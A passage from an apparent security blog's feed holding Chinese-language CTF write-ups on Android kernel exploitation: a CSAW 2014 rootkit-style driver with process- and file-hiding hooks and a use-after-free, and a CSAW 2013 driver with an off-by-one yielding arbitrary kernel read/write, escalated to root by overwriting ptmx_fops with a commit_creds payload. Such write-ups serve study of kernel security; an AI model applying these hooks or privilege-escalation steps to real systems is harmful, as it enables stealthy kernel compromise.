class="keyword">int</span> namelen, <span class="keyword">loff_t</span> offset, u64 ino, <span class="keyword">unsigned</span> d_type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hidden_pid</span> *<span class="title">hp</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *endp;</span><br><span class="line">    <span class="keyword">long</span> pid;</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">"%s: enter, name=%s\n"</span>, __func__, name);</span><br><span class="line"></span><br><span class="line">    pid = simple_strtol(name, &amp;endp, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hp, &amp;hidden_pids, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        DEBUG(<span class="string">"Checking name against: %ld-%ld\n"</span>, hp-&gt;pid_start, hp-&gt;pid_end);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( (pid &gt;= hp-&gt;pid_start) &amp;&amp; (pid &lt;= hp-&gt;pid_end) )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> proc_filldir(__buf, name, namelen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hook_root_filldir</span><span class="params">( <span class="keyword">void</span> *__buf, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> namelen, <span class="keyword">loff_t</span> offset, u64 ino, <span class="keyword">unsigned</span> d_type )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hidden_file</span> *<span class="title">hf</span>;</span></span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">"%s: enter, name=%s\n"</span>, __func__, name);</span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hf, &amp;hidden_files, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        DEBUG(<span class="string">"Checking name against: '%s' with callback %p\n"</span>, hf-&gt;name, hf-&gt;cb);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strstr</span>(name, hf-&gt;name) )</span><br><span class="line">        &#123;</span><br><span class="line">            DEBUG(<span class="string">"Match!\n"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( hf-&gt;cb )</span><br><span class="line">                hf-&gt;cb(hf);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">"%s: end\n"</span>, __func__);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> root_filldir(__buf, name, namelen, offset, ino, d_type);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以,当我们执行readdir()函数的时候,readdir函数在内部使用fillonedir回调函数,所以我们的hook_proc_filldir和hook_root_filldir会被执行.</p><h3 id="UAF漏洞处"><a href="#UAF漏洞处" class="headerlink" title="UAF漏洞处"></a>UAF漏洞处</h3><p>在hook_sys_shmctl中,可以通过cmd进行进程的隐藏,进程的恢复,文件的隐藏,文件的恢复等功能.<br>我们看一下unhide_file函数.再对比一下unhide_pid,可以发现一个问题,我们将file,free之后,并没有将其从list中删除,我们仍然可以通过它的name在list中获取它.我们观察hook_root_filldir函数,因为我们没有在 list中删除我们刚free掉的文件,通过name我们仍然可以调用到它的hf-&gt;cb函数,这本来是一个debug函数.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unhide_file</span> <span class="params">( <span class="keyword">char</span> *name )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hidden_file</span> *<span class="title">hf</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hf, &amp;hidden_files, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ! <span class="built_in">strcmp</span>(name, hf-&gt;name) )</span><br><span class="line">        &#123;</span><br><span class="line">            suckerusu_kfree(hf-&gt;name);</span><br><span class="line">            suckerusu_kfree(hf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">////////////////////////////////////////////////</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unhide_pid</span> <span class="params">( <span class="keyword">long</span> pid_start, <span class="keyword">long</span> pid_end )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hidden_pid</span> *<span class="title">hp</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( hp, &amp;hidden_pids, <span class="built_in">list</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (pid_start == hp-&gt;pid_start) &amp;&amp; (pid_end == hp-&gt;pid_end) )</span><br><span class="line">        &#123;</span><br><span class="line">            list_del(&amp;hp-&gt;<span class="built_in">list</span>);</span><br><span class="line">            suckerusu_kfree(hp);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>好了,前途一片光明,UAF就可以了,我们发现hidden_pid和hidden_file是一个同样大小的.那么就很好办了.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hidden_pid</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> pid_start;</span><br><span class="line">    <span class="keyword">long</span> pid_end;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hidden_file</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> (*cb)(struct hidden_file *);</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>流程大致如下:</p><ol><li>hide_file函数调用 - &gt;内存分配</li><li>unhide_file函数调用 - &gt;内存返回</li><li>hide_pid函数调用 - &gt;内存分配 - &gt; hf-&gt; cb覆盖区域(将其设置为upup函数地址)</li><li>调用readdir即可.</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blackperl-security.gitlab.io/blog/2018/06/22/2018-06-22-csaw2014-kernelex/" target="_blank" rel="noopener">https://blackperl-security.gitlab.io/blog/2018/06/22/2018-06-22-csaw2014-kernelex/</a><br><a href="http://www.freebuf.com/articles/system/108392.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/108392.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;题目也很长,但是功能也就那一些,这个内核驱动的目的是一个内核的hook,达到rootkit的目的,当然,题目没有做实际的rootkit,只是
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Android-csaw2013</title>
    <link href="https://foyjog.github.io/2018/07/02/Linux-Kernel-Exploitation-on-Android-csaw2013/"/>
    <id>https://foyjog.github.io/2018/07/02/Linux-Kernel-Exploitation-on-Android-csaw2013/</id>
    <published>2018-07-02T14:34:29.000Z</published>
    <updated>2018-07-03T08:18:11.862Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这道题目总体来说比之前的更需要时间阅读代码,但是只要了解了代码的作用,找到了点,利用起来其实并不是很麻烦.整体上是一个off-by-one的漏洞类型,只要通过溢出一个4字节的long数据,即可达到更改任意地址和读取任意地址的效果.</p><p>题目是一个提供一个内核缓冲区的作用,主要的输入输出在ioctl的控制层面上,我们一个个看.</p><h3 id="CSAW-ALLOC-HANDLE"><a href="#CSAW-ALLOC-HANDLE" class="headerlink" title="CSAW_ALLOC_HANDLE"></a>CSAW_ALLOC_HANDLE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CSAW_ALLOC_HANDLE:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> ret;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">alloc_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( copy_from_user(&amp;alloc_args, argp, <span class="keyword">sizeof</span>(alloc_args)) )</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( (ret = alloc_buf(&amp;alloc_args)) &lt; <span class="number">0</span> )</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( copy_to_user(argp, &amp;alloc_args, <span class="keyword">sizeof</span>(alloc_args)) )</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">            handles++;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>输入参数,然后通过alloc_buf分配一个内核buf.</p><h3 id="alloc-buf"><a href="#alloc-buf" class="headerlink" title="alloc_buf"></a>alloc_buf</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc_buf</span> <span class="params">( struct alloc_args *alloc_args )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> *<span class="title">cbuf</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size, seed, handle;</span><br><span class="line"></span><br><span class="line">    size = alloc_args-&gt;size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( ! size )</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">    cbuf = kmalloc(<span class="keyword">sizeof</span>(*cbuf), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( ! cbuf )</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    buf = kzalloc(size, GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> ( ! buf )</span><br><span class="line">    &#123;</span><br><span class="line">        kfree(cbuf);</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cbuf-&gt;buf = buf;</span><br><span class="line">    cbuf-&gt;size = size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;cbuf-&gt;consumers, <span class="number">0</span>, <span class="keyword">sizeof</span>(cbuf-&gt;consumers));</span><br><span class="line">    cbuf-&gt;consumers[<span class="number">0</span>] = current-&gt;pid;</span><br><span class="line"></span><br><span class="line">    get_random_bytes(&amp;seed, <span class="keyword">sizeof</span>(seed));</span><br><span class="line"></span><br><span class="line">    cbuf-&gt;seed = seed;</span><br><span class="line"></span><br><span class="line">    handle = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)buf ^ seed;</span><br><span class="line"></span><br><span class="line">    list_add(&amp;cbuf-&gt;<span class="built_in">list</span>, &amp;csaw_bufs);</span><br><span class="line"></span><br><span class="line">    alloc_args-&gt;handle = handle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过输入的size分配一块内存,然后返回一个handle=buf ^ seed.</p><h3 id="CSAW-READ-HANDLE和CSAW-WRITE-HANDLE"><a href="#CSAW-READ-HANDLE和CSAW-WRITE-HANDLE" class="headerlink" title="CSAW_READ_HANDLE和CSAW_WRITE_HANDLE"></a>CSAW_READ_HANDLE和CSAW_WRITE_HANDLE</h3><p> 这两个函数是输入输出,即负责读取和修改内核区域的buf缓冲区.</p><h3 id="CSAW-SET-CONSUMER和CSAW-GET-CONSUMER"><a href="#CSAW-SET-CONSUMER和CSAW-GET-CONSUMER" class="headerlink" title="CSAW_SET_CONSUMER和CSAW_GET_CONSUMER"></a>CSAW_SET_CONSUMER和CSAW_GET_CONSUMER</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CSAW_SET_CONSUMER:</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="class"><span class="keyword">struct</span> <span class="title">consumer_args</span> <span class="title">consumer_args</span>;</span></span><br><span class="line">           <span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> *<span class="title">cbuf</span>;</span></span><br><span class="line">           <span class="keyword">unsigned</span> <span class="keyword">int</span> i, authorized = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> ( copy_from_user(&amp;consumer_args, argp, <span class="keyword">sizeof</span>(consumer_args)) )</span><br><span class="line">               <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">           cbuf = find_cbuf(consumer_args.handle);</span><br><span class="line">           <span class="keyword">if</span> ( ! cbuf )</span><br><span class="line">               <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; MAX_CONSUMERS; i++ )</span><br><span class="line">                <span class="keyword">if</span> ( current-&gt;pid == cbuf-&gt;consumers[i] )</span><br><span class="line">                   authorized = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> ( ! authorized )</span><br><span class="line">               <span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">           cbuf-&gt;consumers[consumer_args.offset] = consumer_args.pid;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>这里便是漏洞所在的地方了,下面这一句存在着一个off-by-one的漏洞可供利用.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cbuf-&gt;consumers[consumer_args.offset] = consumer_args.pid;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> consumers[MAX_CONSUMERS];</span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> seed;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">consumer_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> handle;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> pid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> offset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到consumer_args.offset是一个char类型,值在0-255之间,如果offset为255的话,MAX_CONSUMERS也是255,那么consumers[255]其实是buf的地址.(关键点)<br>所以通过将offset设置为255,利用CSAW_SET_CONSUMER和CSAW_GET_CONSUMER就可以对buf的地址进行泄漏和修改.</p><p>修改了buf的地址,我们通过CSAW_READ_HANDLE和CSAW_WRITE_HANDLE就可以实现对任意地址的泄漏和修改.</p><p>但是如果我们修改了buf的地址,就无法利用原来的handle通过find_cbuf来再次接触到buf了,所以,我们还需要通过泄漏buf的地址来修改seed达到控制handle的效果.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct csaw_buf *<span class="title">find_cbuf</span> <span class="params">( <span class="keyword">unsigned</span> <span class="keyword">long</span> handle )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">csaw_buf</span> *<span class="title">cbuf</span>;</span></span><br><span class="line"></span><br><span class="line">    list_for_each_entry ( cbuf, &amp;csaw_bufs, <span class="built_in">list</span> )</span><br><span class="line">        <span class="keyword">if</span> ( handle == ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)cbuf-&gt;buf ^ cbuf-&gt;seed) )</span><br><span class="line">            <span class="keyword">return</span> cbuf;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p>得到了读写任意地址的机会,接下来就比较好办了,有几种常用的方法进行提权,这里使用ptmx的ptmx_fops就可以做到提权了.<br>ptmx的fops如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="keyword">loff_t</span> (*llseek) (struct file *, <span class="keyword">loff_t</span>, <span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*read) (struct file *, <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*write) (struct file *, <span class="keyword">const</span> <span class="keyword">char</span> __user *, <span class="keyword">size_t</span>, <span class="keyword">loff_t</span> *);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_read) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    <span class="keyword">ssize_t</span> (*aio_write) (struct kiocb *, <span class="keyword">const</span> struct iovec *, <span class="keyword">unsigned</span> <span class="keyword">long</span>, <span class="keyword">loff_t</span>);</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure></p><p>如果调用readv()读取ptmx设备的话,他的调用顺序如下:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readv-&gt;vfs_readv-&gt;do_readv_writev-&gt;do_sync_readv_writev-&gt;fn(...);</span><br></pre></td></tr></table></figure></p><p>fn的地址是f_op-&gt;aio_read的地址,那么就很简单了,更改aio_read的地址,然后将其设置为提权shellcode即可,这在exp中显示的非常清楚.</p><p>我觉得这个exp写的非常好,shellcode布局利用c语言来进行布局,省去我们关心栈上的问题.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_root</span> <span class="params">( <span class="keyword">void</span> *iocb, <span class="keyword">const</span> struct iovec *iov, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_segs, <span class="keyword">loff_t</span> pos )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _commit_creds commit = (_commit_creds)commit_creds;</span><br><span class="line">    _prepare_kernel_cred prepare = (_prepare_kernel_cred)prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line">    *cleanup = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    commit(prepare(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>布置参数,和aio_read一样,这样即能省去布置的任务,也能保证shellcode的顺利执行并且回到我们的用户区中来.</p><h3 id="关于LIST-HEAD"><a href="#关于LIST-HEAD" class="headerlink" title="关于LIST_HEAD"></a>关于LIST_HEAD</h3><p>通过gdb的观察能够很清晰的发现LIST_HEAD的关系<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ print *(struct csaw_buf *) <span class="number">0xecb5f000</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  consumers = &#123;<span class="number">0x462</span>, <span class="number">0x0</span> &lt;repeats <span class="number">254</span> times&gt;&#125;,</span><br><span class="line">  buf = <span class="number">0xc04f791c</span> &lt;ptmx_fops+<span class="number">16</span>&gt; <span class="string">""</span>,</span><br><span class="line">  size = <span class="number">0x100</span>,</span><br><span class="line">  seed = <span class="number">0x63ddff48</span>,</span><br><span class="line">  <span class="built_in">list</span> = &#123;</span><br><span class="line">    next = <span class="number">0xc04ac2f4</span> &lt;csaw_bufs&gt;,</span><br><span class="line">    prev = <span class="number">0xc04ac2f4</span> &lt;csaw_bufs&gt;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ print csaw_bufs</span><br><span class="line">$<span class="number">5</span> = &#123;</span><br><span class="line">  next = <span class="number">0xecb5f408</span>,</span><br><span class="line">  prev = <span class="number">0xecb5f408</span></span><br><span class="line">&#125;</span><br><span class="line">gdb-peda$ print *<span class="number">0xecb5f408</span></span><br><span class="line">$<span class="number">6</span> = <span class="number">0xc04ac2f4</span></span><br><span class="line">gdb-peda$ print *<span class="number">0xc04f791c</span></span><br><span class="line">$<span class="number">7</span> = <span class="number">0x0</span></span><br></pre></td></tr></table></figure></p><h3 id="ptmx-fops的地址"><a href="#ptmx-fops的地址" class="headerlink" title="ptmx_fops的地址"></a>ptmx_fops的地址</h3><p>我试了一些系统,发现有些在vmlinux中有这个,通过kallsyms来查看,但是我试的环境没有.</p><ol><li>我通过gdb attach之后可以直接拿到.</li><li>通过具体偏移来定位点,查看源码/drivers/tty/pty.c可以看到:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __<span class="function">init <span class="title">pty_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">legacy_pty_init();</span><br><span class="line">unix98_pty_init();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>通过查看pty_init的地址然后通过偏移计算出ptmx_fops的地址.</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blackperl-security.gitlab.io/blog/2018/06/08/2018-06-08-csaw2013-kernelex/" target="_blank" rel="noopener">https://blackperl-security.gitlab.io/blog/2018/06/08/2018-06-08-csaw2013-kernelex/</a><br><a href="https://blog.csdn.net/babyzhaoshu521/article/details/60881951" target="_blank" rel="noopener">https://blog.csdn.net/babyzhaoshu521/article/details/60881951</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;这道题目总体来说比之前的更需要时间阅读代码,但是只要了解了代码的作用,找到了点,利用起来其实并不是很麻烦.整体上是一个off-by-one的
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux Kernel Exploitation on Android-csaw2011</title>
    <link href="https://foyjog.github.io/2018/06/29/Linux-Kernel-Exploitation-on-Android-csaw2011/"/>
    <id>https://foyjog.github.io/2018/06/29/Linux-Kernel-Exploitation-on-Android-csaw2011/</id>
    <published>2018-06-29T08:08:34.000Z</published>
    <updated>2018-07-03T08:17:51.577Z</updated>
    
